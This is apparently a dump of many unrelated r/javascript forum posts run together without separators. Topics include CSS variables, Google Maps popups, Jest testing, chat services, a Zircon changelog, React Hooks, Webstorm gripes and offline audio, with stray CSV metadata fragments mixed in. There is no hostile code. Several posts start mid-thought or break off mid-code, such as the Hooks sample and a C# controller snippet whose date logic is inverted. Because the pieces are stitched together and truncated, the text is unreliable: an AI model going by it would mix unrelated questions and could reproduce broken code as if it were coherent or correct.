My code should work like this, I define the variable ""--ProjectMargin"" at, let's says, -1000px and when this div under the class ""stack"" is active/clicked on, that other element under the class ""project"", which using the var(--ProjectMargin) as value fo its top-margin sees the var changed from -1000px to 10vh with javascript and go at the center of the screen as expected. And become visible with the same principle applied but with stack:nth-of-child or in javascript document.getElementsByClassName('stack')[n] and an opacity property using another variable when I want to chose which project become visible.


I think my logic is correct, I hope so at least, but I absolutly don't know how to write it in javascript, as you can't modify variable value in css with only an :hover/active/focus tag. It's probably quite simple but I usually don't do any JS (I rarely do CSS/HTML either tbh but at least I understand it)

I have something like this but it obviously doesn't works, as I know it's completly wrong :( 

    

    var ProjectMarginValue = styles.getPropertyValue('--ProjectMargin');
    document.getElementByClassName('stack').onmouseover = function() {
            // do something like for example change the class of a div to change its color :

I will be very thankful if anyone can point out my mistake. I was following this [tutorial](https://leewc.com/articles/google-maps-infowindow/) on how to display each pop up windows with their own content.  

&amp;#x200B;

Goal:

each marker on Google Maps 

will show the restaurant location. Each location has one or more  chef's recommend. 

when user click on the marker it will bring up the Google Maps pop up info windows

The info will be the chef's recommend that has been assigned

to that particular restaurant (each can be more than one). 

&amp;#x200B;

What I already achieve:

Each marker position has retrieve and shown correctly on the Google Maps from the database.

Each  marker has their own pop up windows.

Each will are able to show content.

&amp;#x200B;

Problem:

Each pop up windows on the marker will have the same chef's recommend content that are currently the

last row of the database.

Hello hope it's ok to ask beginners questions here.

Ive been self learning javascript and want to put testing into a project. Can i have some advice on unit tests for below functionality, and good practise to follow for writing testable code. Im looking to use jest if it matters. Is there any good resources you can recommend on this topic?

Most end points have two middleware functions

Router.post('/expense')
authenticate // middleware takes token and puts user on req
addexpense // controller interacts with db


I validate data from request in the controller and inside mongoose pre save hook, should all validation be moved to functions so its easier to test ?

My controller functions write to a database, how do you unit test that? Should i write as two functions, one that outputs an object which controller can then use to write to database?

Some years ago I've created a small project and have forgotten it for long time. Just today someone complained (at github where I moved it at some point) it won't work with HTML5. I've checked and found it really gets broken when I add `&lt;!doctype html&gt;`. Luckily I also found that some kind fellow already proposed solution (also long time ago, I missed it, I'm sorry) - by adding ""px"" to numeric values written to attributes of dom elements... I'll show it below. So it was easy to fix .

Right now we need a new functionality to create custom forms on the frontend with the definition of this form stored in the backend. For example, a user of the system may want to define a form that contains two fields, `Name`, which is a text field that cannot be bigger than 16 characters, and a `Age` field which is another field that only allows numeric values.

What I had in mind is to create a REST endpoint like `/api/form-definition/my-form-definition-id` returning a JSON response like this:

```
[{
""label"": ""Name"",
""type"": ""string"",
""field_type"": ""text_area"",
""field_name"": ""name"",
},
{
""label"": ""Age"",
""type"": ""integer"",
""field_type"": ""text_area"",
""field_name"": ""age"",
}
]
```

Then any pure javascript frontend could read this information and render an appropriate form for its platform.

I'm building a react-based web client first but hope to also support a React Native mobile app and Electron desktop app eventually. I have a graphql-yoga node server (which is built on express).  


Since I hope to build a production-ready app that's scalable, and I'm new to building realtime/chat applications, I'm thinking of using a 3rd party chat-as-a-service API and I'm looking for opinions on my best options. So far, these are the ones I've come across:  


* Twilio - r/https://www.twilio.com/chat
   * Seems powerful but insanely expensive (assuming 100k users it would cost $2000/month BEFORE adding per-message costs)
* Sendbird - r/https://sendbird.com/
   * Looks like it does what I need but their pricing page is cryptic, it literally lists no prices, it just says to contact them. If anyone has experience with Sendbird and can give me a ballpark estimate of pricing, that would be very helpful, thanks!
* PubNub - r/https://www.pubnub.com/products/chatengine/
   * Looks promising. Pricing is a lot more reasonable than Twilio.
* Pusher - [https://pusher.com/chatkit](https://pusher.com/chatkit)
   * Also looks promising, seems like the cheapest option with a great free plan. However, it's currently in public beta so I don't know how reliable it is, or whether the API will change.

If anyone has experience using any of these services, I'd love to hear your stories. Or, if there are any services I'm missing let me know!

Also note that I'm not entirely against building my own chat servers, but I'm unfamiliar with the best-practices of building scalable realtime node servers so if you could point me to any additional resources that would be great.

\- the post request must contain a 'key' property with the value being a generated gfyname.

&amp;#x200B;

I was able to find a working 'hack' on stack overflow that looks like this: 

    const concat = require(""concat-stream"")
    const FormData = require('form-data');
    const fd = new FormData();
    const fs = require('fs');
    
    fd.append(""hello"", ""world"")
    fd.append(""file"", fs.createReadStream(""/tmp/name""))
    fd.pipe(concat({encoding: 'buffer'}, data =&gt; {
      axios.post(""https://filedrop.gfycat.com"", data, {
        headers: fd.getHeaders()
      })
    }))

However, the user that posted this provided no information as to what this is actually doing, and using 'concat-stream' loads the entire video in javascript memory before posting it to gfycat, which is the opposite of what I am trying to achieve. 

&amp;#x200B;

This also creates a secondary problem with axios where the default maxContentLength property is overridden and set to 10MB, causing the post request to fail (most videos I will be uploading will be somewhere in the 80MB range depending on length). So, the only workaround I've found to this particular problem is to set this property explicitly at request time to Infinity. Further reading on this can be found [here](https://github.com/axios/axios/issues/1362) if you're interested.

&amp;#x200B;

Now all of that brings me to wanting to 'stream' this data to the upload service, but I've no idea how to achieve that or if that is even possible. Am I on the correct track of thinking here, or is there something I am not looking at correctly?

2091,2018-10-18 07:13:16,9,1,"I recently found it necessary to be able to pass the property of an object by reference. For example, in simple JavaScript:
```javascript
const person = {
	name: ""Foo"",

};

delayedIncrement(person, ""score""); 

function delayedIncrement(object, key) {
	const oldValue = object[key];
	setTimeout(() =&gt; object[key] = oldValue + 1);
}
```
This is, however, very far from being type-safe.

What I eventually came up with was [ObjectValue.ts](https://gist.github.com/AlexVallat/5423ac89039f9c40420dda2e324c47d2) which wraps the object and the key together in a checked, type-safe way, allowing:

```typescript
delayedIncrement(new ObjectValue(person, ""score""));

function delayedIncrement(objectValue: IObjectValue&lt;number&gt;) {
	const oldValue = objectValue.get();
	setTimeout(() =&gt; objectValue.set(oldValue + 1));
}

// Type safety:

delayedIncrement(new ObjectValue(person, ""scre"")); // error TS2345: Argument of type '""scre""' is not assignable to parameter of type '""name"" | ""score""'.

delayedIncrement(new ObjectValue(person, ""score"")); // error TS2345: [...] Type 'number' is not assignable to type 'string'
```
The type checker validates that the key exists on the object, and that the value of the property of that key on the type of the object is of the expected value. Nice.

So, I use dynamic import to code split my app.  The app itself is served up by Apache and auth protected (in my case, by Shibboleth).  When the session expires (I manually delete the shib cookie for testing), and I make a XHR request to APIs, I can catch that a 401 Unauthorized comes back and respond accordingly (I do a location.reload(true) to force it to re-authenticate to Shib).  

However, if the user clicks on something that catches a dynamic import (say another route inside the app), then the import() fails and I catch the error.  *However*, it does not and will not contain the HTTP error response status (401).  It just gives me a generic browser error, which I cannot discern a 401 from a 404, from a 500.  Just an ""error"".

I am a statistician, so I work mostly on the backend side developing machine learning models, or optimization models in languages like python, Julia, and sometimes Rust. I am working on a new project that involves writing an Agent Based model with a web frontend. So the app needs to do some reasonable number crunching for the model--well within the ability of a desktop computer and browser--but also needs to visualize the results with a package like D3. 

I was trying to understand the right way to architect an application like this. I have done a bunch of tutorials on Nodejs, React, D3, Typescript, etc., however, I really don't have any experience developing an HTML frontend or building a Node app. My bigger question is how to handle the numerical computation side. So I would like to run the computation in the browser if I can, and then populate the visualizations with the data. That is my first choice. But if that does not work or takes too much overhead, then I would have to run the computation on the server and then send the data to the front end to visualize. 

So I was just trying to understand the right way to architect an app for either option 1 or option 2. I need to make sure that I decouple the frontend from the backend, so if I have to switch from processing the model in the browser versus on the server, this should not affect the front end code. 

Second, what is the right way to setup the numerical work for the model? This is where I could use some insights from the voice of experience. I could just write the model in pure javascript and run it in browser. If that is slow there is a choice to use something like Emscripten and compiled Javascript with WASM. Or I could write a Node module. But I have read about all of these approaches, but I don't have a sense of which is the easiest and most practical way to understand this type of development projects.

## New Features

There are numerous new features in this release:

- [#100](https://github.com/Hexworks/zircon/issues/100): *Support all Input events on components properly.*

  Now all `Input` events can be properly listened to on `Component`s: `InputListener`s can be added or
  the specific listener methods can be called with a lambda like `onDrag` or `onMouseReleased`
- [#90](https://github.com/Hexworks/zircon/issues/90): *Add the option to enable beta features in Zircon*

  Now there is a switch in `AppConfig` which can be used to enable beta features like `Animation`s and
  the `GameComponent`
- [#89](https://github.com/Hexworks/zircon/issues/89): *Add the option to run Zircon in debug mode*

  This can also be enabled now from `AppConfig`. It will display specific log entries and also the current
  FPS. This feature will be enhanced later.
- [#76](https://github.com/Hexworks/zircon/issues/76): *Introduce ShutdownHook in Zircon*

  Now `ShutdownHook` can be used to notify the user before Zircon closes  
- [#75](https://github.com/Hexworks/zircon/issues/75): *Improve Animation to return an AnimationResult*

  Starting an `Animation` will now return a handle which can be used to interact with the `Animation` (like `stop`ping it).  
- [#54](https://github.com/Hexworks/zircon/issues/54): *Embedding images/bitmaps*  
- [#46](https://github.com/Hexworks/zircon/issues/46): *Implement ""Log"" Component*

  The `LogArea` component was implemented *(great thanks to **coldwarrl**!)*.
- [#8](https://github.com/Hexworks/zircon/issues/8): *TileColor transformations*

  The following transformations were implemented:
  - `tint`: adding a different color to this one
  - `shade`: lighten or darken the color
  - `invert`: flip the color to its opposite (blue vs red for example)
  

## Enhancements

These are the **enhancements** which were done in this release:

- [#112](https://github.com/Hexworks/zircon/issues/112): *Allow Position and Size to have negative values, and add a check in the components framework not to allow them there.*
- [#107](https://github.com/Hexworks/zircon/issues/107): *Reconcile the usage of properties vs functions (eg: size(), position() vs size and position*

  These were streamlined and the weird getters (`position()`, `size()`, etc) are now gone. Now there is a proper getter / setter
  for everything and mutator/transformer methods which return the object are prefixed with `with*`.
- [#105](https://github.com/Hexworks/zircon/issues/105): *Separate Modifier into tile transformer and texture transformer modifiers.*

  Now there are two kinds of `Modifier`s. One which modifies how textures are transformed, and one which can modify a `Tile` before
  it is rendered.
- [#103](https://github.com/Hexworks/zircon/issues/103): *Reconcile getTileAt, setTileAt, getRelativeTileAt and setRelativeTileAt.*

  These were ""sanetized"" now it is straightforward and well documented which is which and how to use them.
- [#102](https://github.com/Hexworks/zircon/issues/102): *Provide a proper `Snapshot` object for `snapshot()` instead of a `Map`*

  Now the `snapshot()` method returns a proper `Snapshot` object instead of just a `Map`. 
- [#84](https://github.com/Hexworks/zircon/issues/84): *Font to Tile refactor*

  This was a rather thorough change. Previously Zircon used the `Font` abstraction which was now refactored
  to `Tile` and `TilesetResource` which streamlines and simplifies how `Tile`s can be loaded and used.
  It is now also easier to write support for new kinds of fonts, tiles, and such.
- [#83](https://github.com/Hexworks/zircon/issues/83): *Refactor Blink handling and Animation handling to be part of the incremental rendering*

  `Blink` and `Animation` timing is now handled by the continuous renderer. This does not change how the API
  works, but makes the code of Zircon more robust, and less error prone.
- [#82](https://github.com/Hexworks/zircon/issues/82): *Continuous rendering*

  Now Zircon does continuous rendering: the user will no longer have to call `refresh` and other such methods
  in order to redraw the screen. The `Application` class was also introduced to accommodate this change.
- [#81](https://github.com/Hexworks/zircon/issues/81): *Multiplatform refactor*

  The majority of the code in `zircon.jvm` were moved to `zircon.core` which is a Kotlin common project.
  This will enable the development of javascript and native variants of Zircon.
  [#84](https://github.com/Hexworks/zircon/issues/84) made this possible. Now images can be drawn onto
  a `DrawSurface` using the `ImageDictionaryTilesetResource`. The related example can be found [here](https://github.com/Hexworks/zircon/blob/c9b3edebc2dc7ae66d58419900523f54579eb370/zircon.examples/src/main/kotlin/org/hexworks/zircon/examples/ImageTileExample.kt)
  and it looks like [this](https://cdn.discordapp.com/attachments/363771631727804416/473082395562737694/unknown.png). 
- [#74](https://github.com/Hexworks/zircon/issues/74): *Streamline how Positions and Sizes work*

  Previously it was not possible to create `Position`s with a negative component (`x`, or `y`), not it
  is possible, and it is only limited in specific places (like `Component`s)
- [#73](https://github.com/Hexworks/zircon/issues/73): *Improve TileGraphics performance*

  `TileGraphics` used arrays before, now it uses sparse `Map`s. This enhances performance, and also makes it possible
  to have `TileGraphics` with stupid size.  
- [#69](https://github.com/Hexworks/zircon/issues/69): *CombineWith should resize new image to fit TileGraphics*

  When `combineWith` is called on a `TileGraphics` it will properly be resized to accommodate the other image.
- [#67](https://github.com/Hexworks/zircon/issues/67): *Add word wrap to CharacterTileString*

  `CharacterTileString` now supports word wrap!
- [#61](https://github.com/Hexworks/zircon/issues/61): *Proper `FontTextureRegion` abstraction for different backends.*

  Previously `Tile` drawing for different backends (Swing, LibGDX, etc) was a bit convoluted. Now this is streamlined.
- [#60](https://github.com/Hexworks/zircon/issues/60): *Proper modularization depending on GUI backend*

  Zircon was split into multiple projects (`zircon.core`, `zircon.jvm`, `zircon.jvm.swing`, `zircon.jvm.libgdx`). This makes
  the artifacts more lightweight, and the codebase is also separated along the GUI framework backends.
- [#59](https://github.com/Hexworks/zircon/issues/59): *Component wrapping refurbishment*

  Component wrapping was refactored. Now `ComponentDecorationRenderer`s can be added to any `Component` during creation.
  This makes it possible to apply any decoration to any component. 
- [#55](https://github.com/Hexworks/zircon/issues/55): *Fix and test TextBox*

  This was a bit convoluted before, now it is better and has more tests.
- [#38](https://github.com/Hexworks/zircon/issues/38): *Half-width Tile support*

  Now it is possible to use `TilesetResource`s which are not square, there are also some added tilesets like
  `Acorn` and `Lord Nightmare`.
- [#32](https://github.com/Hexworks/zircon/issues/32): *Tile alignment by pixel*

  Now `Tile`s can be aligned by using `AbsolutePosition`. Note that this feature is still in beta.


## Bug fixes

The following **bugs** were *fixed*:

- [#111](https://github.com/Hexworks/zircon/issues/111): Fix RadioButton.select() to change the selection in its parent as well
- [#77](https://github.com/Hexworks/zircon/issues/77): Swing terminal is not being redrawn in response to exposure event 
- [#66](https://github.com/Hexworks/zircon/issues/66): Adding Components to a Container which is not yet attached to a ContainerHandler will lead to positioning problems
- [#65](https://github.com/Hexworks/zircon/issues/65): RadioButtonGroup throws stacktrace if you click empty space
- [#64](https://github.com/Hexworks/zircon/issues/64): Minimizing a swing terminal and then restoring it causes the screen to go grey
- [#47](https://github.com/Hexworks/zircon/issues/47): Adding a component to a container which has no font before attaching that container to a Screen leads to font error.


## Roadmap
  
There are several things on the radar, like:

- Refactor parallelism and concurrency to use Kotlin coroutines
- Implement a Javascript (browser) module and finish the LibGDX implementation
- Finish custom `Component` support
- Add **floating**, **modal** and **scrollable** components
- `Component` layout support
- Drag'n drop support
- Component themes
- Simple and easy to use data binding and MVC support

Hi All,

Short background: long time (3+ years) professionally (7+ years) personally python user. Not a webdev (mostly using python, pandas, numpy but also some flask, js, pyspark). **I'm mostly happy** but also sometimes get frustrated (refactoring dynamic code, other's people code, lack of static analysis in python tools, deploying, devops work). I've been looking at Scala but it's so hard because I can't use it at work and whenever I write personal project in Scala I quickly switch to python (can't bear frustration of its stdlib, sbt, inefficiencies, etc. even though Scala is nicer language in few ways. I could deal with those things if I'm getting paid for my scala work).

I'm getting bit scared as I'm approaching 30 in few years and don't really have anything else in my portfolio. I know demand for python and javascript is strong but it still feels unsafe. I'm also fearful that I'm missing out but don't really want to take leap of faith switching. I don't want to end up with JS focused role, neither C++ or pure Java. There doesn't seem to be *that* strong demand for Scala engineers (assuming decent pay; in Zurich and London) - it's hard for me to get interview for scala roles but I canafford to turn down python offers (and currently working as one).

My current idea is to perhaps go deeper in typescript (assuming I can get it for work project), do more in-depth dive into CPython, pypy, py/pandas speed optimization, etc. or come up with good open source project (e.g. be able to get talk at Tier 1 conference) or create profitable side-project.

&amp;#x200B;

Have you experienced something similar? Please share",I've been happily using python almost exclusively for years commercially. FOMO not using other languages but scared to switch. (+bonus question: do you regret voluntarily switching away from python?)

&lt;ol&gt;
&lt;li&gt;Both Chrome and Node.js use V8, in Chrome, I can open dev tool, edit the source code, save, and then continue running with all changes applied, but why in Node.js, I have to restart the server to apply changes I made to the source code? I heard V8 engine uses JIT compiler, thus, it should be able to edit the source code, the JIT compiler only reads text it needs directly from the source code to compile to machine code during runtime, right?&lt;/li&gt;
&lt;li&gt;How a Javascript source code is compiled and interpreted? For instance I have a file named index.js like this:&lt;/li&gt;

&lt;p&gt;when I run&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;node index.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;can you tell how the compile and interpret steps happen?&lt;/p&gt;

&lt;p&gt;The source code being compiled and interpreted right when in met the function &lt;code&gt;a&lt;/code&gt; declaration or until it met the function call &lt;code&gt;a(10)&lt;/code&gt; ? If we don&amp;#39;t have the &lt;code&gt;a(10)&lt;/code&gt;, is there anything being compiled?&lt;/p&gt;

In my free time, I like to work on a little side project web game and it's getting to a point where things are really messy. My main js has over 5k lines of code. I also have some additional js files for objects/classes.

Currently, I just make sure in the index.html file, I include the script tags in a correct order eg:

    &lt;script src='Skills.js'&gt;&lt;/script&gt;
    &lt;script src='Quests.js'&gt;&lt;/script&gt;
    &lt;script src='Items.js'&gt;&lt;/script&gt;
    &lt;script src='main.js'&gt;&lt;/script&gt;

I was wondering what would be the best solution to my problem.

Should I use Gulp to concatenate everything into 1 file.

Should I use something like Webpack? I never really looked too deep into webpack so I don't know if this will benefit anything.

i know closure has something to do about a function that has a inner function and that inner function has access to its outer function's values. ok so what. why should i care?

recursion is when a function calls itself similar to a for loop until and stops when it fails a condition. again so what?

'this' keyword refers to the object that is being invoked along with some gotchas. sometimes 'this' keyword will change depending whether its used in a functions, arrow functions, map and probably other cases i dont know about. then you have to use .bind to fix the 'this' reference which adds more to the confusion.

i'll look at all these trivial examples and understand how it works but they are not practical. how do i hammer these topics into my head so that i never forgot how they work.

It's a great time to talk about this library.

&amp;#x200B;

In my project (dashboard, inner screens, wizards) we use it in development and it's nice because you can:

* Design a component very conveniently:
   * There is no need to launch, rebuild, rely on hot reload of the whole application when designing.
   * There is no need to navigate to the place where a component exists in.
   * You can ensure your component is ""pure"" and works by itself without relying on any external processes.
* Send it to the QA, Designers, Product managers etc...

But the moment a component is ready and released, **no one maintains it's story**.

&amp;#x200B;

It might be confusing for people to find out an outdated story of a component. They can sometimes spend time finding out how things work and until they realize it's just outdated because someone worked on the component without updating the story.

I believe it happens because:

* When you work and launch the application in development and it already runs anyway, it's more convenient to work on your component in the general context.
* Components tend to change slowly and it's more convenient to work on them without launching storybook.
* We currently don't have any convenient way to point out a component has a story and that you should work on the story if you change it.

So what's your take on maintaining a storybook?",(How) Do you maintain a storybook?

2139,2018-10-31 17:46:09,14,1,"# The goal

Sadly, Reddit's flavor of Markdown won't syntax highlight your code if you try adding your language like this:

    ```js
    const foo = ""bar"";
    ```

This makes code snippets less readable. This userscript's goal is to add syntax highlighting to code, as well as add line numbers on the side. This should hopefully make reading code snippets on Reddit a bit more pleasant, instead of having to copy them over into your preferred text editor or IDE just to get the proper syntax highlighting.

- [Userscript website][website]
- [Userscript repository][repository]
- [Direct install link][userscript] (also available in the repo and website)

# How does it work?

The trickiest part about this userscript was handling the question: ""How do I know what language this code snippet is written in?"". Usually a file extension is a pretty good indicator of the programming language contained inside. The problem is that Reddit has no files to work it; it's just snippets of code.

This userscript uses [PrismJS](https://prismjs.com/) under the hood in order to do the syntax highlighting. At the time of writing this, PrismJS supports 152 different languages, so determining the language a code snippet is using is difficult.

I'll talk about some of the approaches I considered to tackle this problem, as well as the one I ended up picking.

## Naive Bayes classifier

At first I thought about using a naive Bayes classifier in order to tell the languages apart, but this approach had some problems:

1. The filesize of the userscript would be immense if I tried teaching the classifier with numerous source code files for all of the 152 supported languages.
2. Even if filesize wasn't an issue, I imagine that the classifier would guess wrogly often due to the sheer number of different languages as well as the similarities they might share.

## Letting the OP signify the language in their snippets

Like I said earlier, Reddit doesn't provide the functionality of specifying the language inside the code block. However, I considered allowing the person writing the post/comment to include the language in some fashion, and then having the userscript pick up on that.

This approach has the advantage of being the most reliable. However, the downfall is that I can't expect everyone to have this userscript installed. There would be a majority of people not signifying the language in their code snippets simply because they might not know about this userscript, or because they didn't format their code properly.

## Let the userscript user select the language themselves

This is the approach that I chose. Since I can't rely on people specifying the language of their code snippets, and since it's too time-consuming and difficult to programmatically determine the language of said snippet, I figured I'd let the user pick the language themselves.

As such, the userscript will attach a dropdown list containing all of the supported languages above every code block it detects. The user can then pick the language from the list to highlight the code.

The downfall is that the burden of picking the appropriate user is now put on the user. Recall that there are 152 supported languages which the user has to look through in order to find the one they need. This gets tedious fast.

### Introducing suggestion buttons

To mitigate this, I also added what I like to call ""suggestion buttons"" right next to the dropdown list. The suggestion buttons are supposed to be a quick way of selecting the language you're looking for. How does the userscript know which languages to suggest?

I might not have file extensions to work with on Reddit, but I do have subreddits. If you're browsing `r/javascript`, chances are that you'll want to syntax highlight code blocks in JavaScript often. Thus, the userscript will add JS as a suggestion button. The userscript recognizes subreddits which include programming language names and will add corresponding suggestion buttons.

However, this also gets tricky. What about subreddits whose names don't include a programming language at all? Or subreddits which often have more than one dominant language in use? For example, `r/webdev` and `r/frontend` fit both of those criterria. For subreddits such as this, it's impossible to programmatically determine which suggestion buttons to offer, so I opted to hardcode them in. It's be unrealistic for me to know what languages are often used on which subreddits, considering that there are so many supported languages. This means that some subreddits will have some suggestions missing which would be convenient to have. If you'd like to help me out with this part, you can do so by contributing to [this file][suggestions-file].

# Contributing

I also welcome any contributions to the project! Like I mentioned, the userscript relies on hard-coded values to determine which suggestion buttons to offer, and it's unrealistic for me to be able to know which suggestions to give for all of the 152 supported languages. If you frequent a subreddit for which the userscript doesn't offer proper suggestion buttons, I encourage you to contribute and add the suggestions yourself. All it takes is modifying a [single file][suggestions-file].

# Conclusion

This project was very fun to work on. If anyone would like to take the time out of their day to critique my code, I'd be very grateful, since this is my first ""serious"" project. I'd also love to hear your thoughts on the problem of determining the language of an arbitrary snippet of code. Would you pick a different approach than the one I did? I'm curious to hear other people's ideas on this topic!

And if the action is overdue, they want to show by how many days, and also to show a red cell color if it is overdue. And if not, just return the value of false.

This is a typical set up of an MVC project. And in my controller, I have the following function:  


&amp;#x200B;

public string SuspenseDate()

{

//get suspense date by documentID

//check if date = [Date.Now](https://Date.Now)()

//If date != [Date.Now](https://Date.Now)() show day amount overdue

DateTime actionDueDate = \_service.ActionSuspenses(\_document.DocumentId);

DateTime currentDate = [DateTime.Now](https://DateTime.Now);

TimeSpan elapsed = currentDate.Subtract(actionDueDate);

double daysAgo = elapsed.TotalDays;

&amp;#x200B;

if (currentDate &lt; actionDueDate)

{

return daysAgo.ToString();

}

else

{

return actionDueDate.ToString(""DD/MM/YY"");

}

On a website that I logon to and upload SVG files, there is a file size limit that I discovered is enforced through javascript running on the client-side. I discovered this when I had the upload page open, but was offline, and it returned the error that the file size was too large. This indicated to me that the file was not sent to the server for comparison, but compared on the client. I ran the developer tools in Chrome and Firefox, stepping into the functions, but could not locate the function that was comparing the file size. The script is huge, and I don't know exactly what I am looking at (or for). Now, I am not trying to violate any terms of the website, I was just so curious after I made that accidiental discovery, that I spent a better part of my work day yesterday trying to uncover it. And then I returned to it today, it is preoccupying my mind, and I just want to find and figure it out. Can you give me some suggestions on how to digest the script properly?

2157,2018-11-06 18:00:24,6,1,"This is a follow-up to [this previous thread about Hooks](https://www.reddit.com/r/javascript/comments/9tqwgr/react_hooks_rewriting_early_impressions/).  I wasn't going to write any more about it, but things changed enough that I thought it might valuable for others.

Here are some takes:

* Custom Hooks are doing more work than components.  I would now describe a component by 1) the props it may be provided, 2) the Custom Hooks it consumes, and 3) the template it produces.

Data flows this way: `Props 🔜 Custom Hooks 🔜 Component 🔜 Template`

* I began thinking about all the functionality in my components as Custom Hooks, and how that functionality could be reimplemented to apply to *any* component.  For example, my `Image` component may have had a method to find its onscreen origin coordinates, but now it consumes a Custom Hook that provides the origin of any DOM element you like.  The added benefit is that it can easily make use of React constructs like updating state.

* I now have a `/components/hooks/` directory in my project for this reusable component logic.

* Hook components are more verbose than class components, at least the way I write them at the moment.  However, the hook component itself can be read very declaratively.  If you aren't interested in the implementation details of the Custom Hooks it uses, it's so much easier to understand what a component is doing now.

Here are some severely pared-down code samples: 1) class component, 2) early hooks rewrite, 3) more polished rewrite.

```
// 1) Class Component

class Image extends Component {
  constructor(props) {
    super(props);

    this.imageRef = React.createRef();
    this.imageDimensions = {};

    this.getImageDimensions = ()=&gt; {
      // set imageDimensions from imageRef DOM data
    };

    this.handleLogImageOrigin = ()=&gt; {
      const [x, y] = this.imageDimensions.origin;

      console.log(`origin: ${x}, ${y}`);
    };
  }

  componentDidMount() {
    this.getImageDimensions();

    const debounce = 500;
    window.addEventListener(`resize`, ()=&gt; setTimeout(this.getImageDimensions, debounce));
  }

  render() {
    return (
      &lt;img ref={this.imageRef} onClick={this.handleLogImageOrigin.bind(this)} /&gt;
    );
  }
}

// 2) Early Hooks Rewrite

const debounce = 500;

const getImageDimensions = (imageRef, imageDimensions) =&gt; {
  // set imageDimensions from imageRef DOM data
};

const updateImageDimensions = (imageRef, imageDimensions)=&gt; {
  getImageDimensions(imageRef, imageDimensions);

  window.addEventListener(`resize`, ()=&gt; setTimeout(()=&gt; {
    getImageDimensions(imageRef, imageDimensions);
  }, debounce));
};

const handleLogImageOrigin = (imageDimensions)=&gt; ()=&gt; {
  const [x, y] = imageDimensions.current.origin;

  console.log(`origin: ${x}, ${y}`);
};

const Image = (props)=&gt; {
  const imageRef = useRef(); // DOM node.
  const imageDimensions = useRef({});

  useEffect(()=&gt; {
    updateImageDimensions(imageRef, imageDimensions);
  }, []);

  return (
    &lt;img ref={imageRef} onClick={handleLogImageOrigin(imageDimensions)} /&gt;
  );
};

// More Polished Rewrite

const debounce = 500;

const useDimensions = ()=&gt; {
  const ref = useRef();
  const [dimensions, setDimensions] = useState({
    origin: [0, 0]
  });

  useEffect(()=&gt; {
    const calcDimensions = () =&gt; setTimeout(()=&gt; {
      // calls setDimensions() with ref DOM data
    }, debounce);

    calcDimensions();

    window.addEventListener(`resize`, calcDimensions);

    return ()=&gt; {
      window.removeEventListener(`resize`, calcDimensions);
    };
  }, []);

  return [ref, dimensions];
};

const useOriginHandler = (imageDimensions)=&gt; {
  const [x, y] = imageDimensions.origin;

  return useCallback(()=&gt; {
    console.log(`origin: ${x}, ${y}`);
  }, [x, y]);
};

const Image = (props)=&gt; {
  const [imageRef, imageDimensions] = useDimensions();

  const handleLogImageOrigin = useOriginHandler(imageDimensions);  

  return (

## Intro

Mixite is a hexagonal grid library. The motivation behind it is to have an optimized, simple and usable library for drawing hexagonal grids without being tied to any GUI framework.

## Highlights of this release

Mixite was known as Hexameter before and this release adds the option to use Mixite from javascript
next to Java / Kotlin. The project was ported to Kotlin, so native targets can be also added in the future.

All previous functionality is preserved, so previous Java users needn't worry!

The release can be used from [Jitpack](https://jitpack.io/#Hexworks/mixite/2018.2.0-RELEASE). Maven Centra synchronization will be added later.

1/ The project will contain thousands of class/races/feats/items/etc. not all of them will be used, i want to give the user a way to choose rules that they want to use for their character, so if they check some particular rule, all the class/races/feats/items/etc. associated with it will be available while obviously, those that aren't, not.

I don't know really how to manage that nor do i know how c# works really here, what if i have files of class instances somewhere in my project, is there a way to load only those that i need (those selected by the user) and eventually ""unload"" them if the user deselect certain rules.

What format do i use ?

2/ In javascript, an object can contain any type of property, i would have a Feat class with a property `EffectOnSelect` and put in there whatever i want but most likely a function that would execute a custom effect when the user select this feat.

**If I remove that moment require, the rest bundles fine.**

2171,2018-11-10 05:32:35,2,1,"This was a question originally asked on Stack Overflow (SO) for a lot of times (e.g. [How to get image size (height &amp; width) using JavaScript?](https://stackoverflow.com/questions/623172/how-to-get-image-size-height-width-using-javascript/53232004#53232004) ). There are a lot of different solutions to this problem, depending on different constraints and requirements. For example, `img.naturalWidth/naturalHeight` will always give you the intrinsic width/height; while the return value of `img.width/height` depends on whether the size of the image object is constrained by HTML attributes or CSS styles.

As part of an ongoing research effort to help developers organize such messy information into a somewhat structured artifact, we constructed a comparison table using the answers found on the [SO page](https://stackoverflow.com/questions/623172/how-to-get-image-size-height-width-using-javascript/53232004#53232004) mentioned above.

2172,2018-11-10 08:46:36,6,1,"In general I like Webstorm, but it has few big flaws.

1. **It is not good for full-stack javascript development.** It's impossible to set multiple `.eslint` configurations for different sub project folders (`/front-end` and `/back-end)`.  It's impossible to set different `.eslint` configurations for different projects either... Hello....?! years is almost 2019. For the record, VSCode do that instantly without any problems.
2. **Same old .idea folder creation problem.** Although hundreds or thousands of user complains Jetbrains still tries to convince their subscribers that this is the right approach. Well, it isn't. I don't like it! I do not want to be created, I do not want to add it in `.gitignore`, I don't want to hear about it at all.

**Conclusion:** Webstorm did not grow! Some small (in some cases meaningful) features are added from time to time, but main model and basics didn't change and soon it will celebrate it's 10th birthday.

I'm not sure why this is the case. I mean, I have a vague idea, but I'm not sure if I'm right.  


I believe my confusion is with:  


1. The return statement inside the arr.push method. When it says 'return i', it appears to be returning a reference to a variable, i, instead of the value i directly. Does this mean it is creating an object?
2. The 2nd last line, why do we need to enclose the array with () at the end, instead of indexing it like normal?

Problem with javascript imports is that you define what you import before from where you import. Which allows autocomplete assist only at the end of the import statement when file from where you are importing is defined. This kinda beats the point of autocomplete.  


Perhaps there are some plugins for VS code and Webstorm alike, which would allow to post a snipper of an import and once you add last semicolon put the cursor back after Import keyword? Or anything like that to help the flawed import syntax?",Regarding Import autocompletes

2198,2018-11-17 12:10:29,5,1,"What is the simplest way to get audio to reliably play offline? I mean simple in terms of pure js with no libraries. I need to play a single piano note. Embedding it into the javascript as raw data would be perfect (the file is not big).

Some context: I am an artist who's dabbled in javascript for over 20 years. So, I'm not an js expert! But js (with CSS) is pretty simple if you just stick to text and images, as I'm sure you'll agree.  So I'm making a game with super simple code: no libraries, and everything works offline. I want it simple so that, in thirty years, if some player finds the game and it doesn't work, they can look at the javascript and make it work themselves on their own machine with only minimal understanding. That way I hope the game might become immortal. Obviously if the game relies on external libraries or a high level of skill then that won't happen. Well, after 20 years of audio hell I heard that HTML5 finally makes audio simple! Except... it doesn't. There are problems with permissions (Chrome's policy) and (I think?) with playing files offline.

I have looked for an idiot proof tutorial (""copy this code and a note will play when you press a button, even in Chrome"") but cannot find one. Any suggestions?

